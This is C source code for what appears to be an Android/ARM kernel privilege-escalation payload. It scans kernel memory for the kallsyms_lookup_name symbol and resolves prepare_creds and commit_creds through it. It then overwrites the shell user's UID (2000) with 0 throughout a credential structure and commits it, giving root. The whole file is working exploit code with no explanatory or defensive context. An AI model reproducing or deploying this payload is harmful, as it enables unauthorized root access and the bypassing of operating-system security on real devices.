#include <stddef.h>
#include <stdint.h>
#include <stdbool.h>

#ifndef NDEBUG
#define DEBUG
#endif

static char *memmem(char *start, char *end, char *needle, unsigned int len, int adv) {
    char *p = (adv > 0) ? start : end-len;
    while (p >= start && p <= end-len) {
        for (unsigned int i = 0; i < len; i++) {
            if (p[i] != needle[i])
                goto next;
        }
        return p;

next:
        p += adv;
    }

    return NULL;
}

static int strlen(char *str) {
    int i = 0;
    while (*str++)
        i++;
    return i;
}

#define KERNEL_BASE   0xc0008000
#define KERNEL_LENGTH 0x01000000 // 16MiB

static void *brute_lookup(char *name) {
    int len = strlen(name)+1;

    char *start = (char *)KERNEL_BASE;
    char *end = (char *)(KERNEL_BASE+KERNEL_LENGTH);

    char *strp = memmem(start, end, name, len, 1);
    if (!strp)
        return NULL;

    void *pp = memmem(start, strp, (char*)&strp, sizeof(char*), -1);
    if (!pp)
        return NULL;

    void **fp = pp-sizeof(char*);
    return *fp;
}

#define ERR(msg, args...) do { printk("Error: " msg "\n", ##args); return 1; } while(0)

#define getsym(name) ({ \
    void *p = kallsyms_lookup_name(name); \
    if (!p) \
        ERR("Symbol %s not found!", name); \
    p; \
})

#ifdef DEBUG
typedef enum {
    DUMP_PREFIX_NONE,
    DUMP_PREFIX_ADDRESS,
    DUMP_PREFIX_OFFSET
} dump_prefix_type_t;
#endif

#define STRUCT_CRED_SEARCH_N_WORDS 0x30
#define MATCH_UID 2000 /* shell */

#define UNUSED __attribute__((unused))

int start(int argc UNUSED, char **argv UNUSED) {
    void *(*kallsyms_lookup_name)(char *) = brute_lookup("kallsyms_lookup_name");
    if (!kallsyms_lookup_name)
        return 3;

    void (*printk)(char *, ...) = kallsyms_lookup_name("printk");
    if (!printk)
        return 2;

    void *(*prepare_creds)() = getsym("prepare_creds");
    int(*commit_creds)(void *) = getsym("commit_creds");

#ifdef DEBUG
    void *(*print_hex_dump)(const char *level, const char *prefix_str, dump_prefix_type_t prefix_type,
                int rowsize, int groupsize, const void *buf, size_t len, bool ascii)
            = getsym("print_hex_dump");
#endif

    uint32_t *cred = prepare_creds();
    if (!cred)
        ERR("prepare_creds failed");

    printk("prepare_creds = %p\n", cred);
#ifdef DEBUG
    print_hex_dump("", "", DUMP_PREFIX_OFFSET, 16, 4, cred, 512, true);
#endif

    int n = 0;
    for (int i = 0; i < STRUCT_CRED_SEARCH_N_WORDS; i++) {
        if (cred[i] == MATCH_UID) {
            printk("Set %p (cred[%d]) %d -> 0\n", cred+i, i, MATCH_UID);
            cred[i] = 0;
            n++;
        }
    }
    printk("Patched %d words (should be 8)\n", n);

    /* TODO: selinux context */

    if (commit_creds(cred))
        ERR("commit_creds failed");

    return 0;
}
